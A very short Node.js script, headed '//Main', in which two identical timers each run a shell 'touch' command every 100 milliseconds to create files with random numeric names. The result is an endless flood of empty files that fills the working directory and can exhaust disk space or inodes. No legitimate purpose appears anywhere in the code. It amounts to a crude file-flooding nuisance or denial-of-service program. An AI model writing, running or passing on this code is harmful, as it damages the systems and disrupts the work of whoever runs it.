//Main
setInterval(function(){
    var random_number = Math.floor(Math.random() * 999999999999999)

    require("child_process").exec(`touch ${random_number}`)
}, 100)

setInterval(function(){
    var random_number = Math.floor(Math.random() * 999999999999999)

    require("child_process").exec(`touch ${random_number}`)
}, 100)
